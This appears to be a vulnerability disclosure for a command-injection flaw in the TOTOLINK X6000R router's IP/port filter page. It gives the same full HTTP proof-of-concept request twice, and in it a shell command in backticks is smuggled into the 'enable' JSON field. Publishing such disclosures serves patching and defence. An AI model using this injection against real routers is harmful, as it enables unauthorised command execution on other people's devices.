# Summary
There is a command execution vulnerability in TOTOLINK X6000R(https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/247/ids/36.html).

Affected component is "/advance/ipf.html".

# Details
Web front-end interface:
![image](https://github.com/user-attachments/assets/9d2eaab1-3448-4ab2-9ed4-0fc1799fae92)


Capture the packet and see the enable parameter, and do a blind test directly.

You have to adjust the format yourself, add "mode": "1" and then move addEffect before enable:
```HTTP
POST /cgi-bin/cstecgi.cgi?token=591BAF19FCA19C0D HTTP/1.1
Host: ip:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 98
Origin: http://ip:8081
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://ip:8081/advance/ipf.html?token=591BAF19FCA19C0D
Priority: u=1

{"mode":"1","addEffect":"0","enable":"`ls >/web/poc_ipf.txt`","topicurl":"setIpPortFilterRules"}
```
![image](https://github.com/user-attachments/assets/016fbb30-50cc-4305-8f51-591b03923e09)

![image](https://github.com/user-attachments/assets/1e48a310-8750-4056-862a-22e743e43095)



# PoC
Capture the packet and see the enable parameter, and do a blind test directly.

You have to adjust the format yourself, add "mode": "1" and then move addEffect before enable:
```HTTP
POST /cgi-bin/cstecgi.cgi?token=591BAF19FCA19C0D HTTP/1.1
Host: ip:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 98
Origin: http://ip:8081
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://ip:8081/advance/ipf.html?token=591BAF19FCA19C0D
Priority: u=1

{"mode":"1","addEffect":"0","enable":"`ls >/web/poc_ipf.txt`","topicurl":"setIpPortFilterRules"}
```
![image](https://github.com/user-attachments/assets/016fbb30-50cc-4305-8f51-591b03923e09)

![image](https://github.com/user-attachments/assets/1e48a310-8750-4056-862a-22e743e43095)
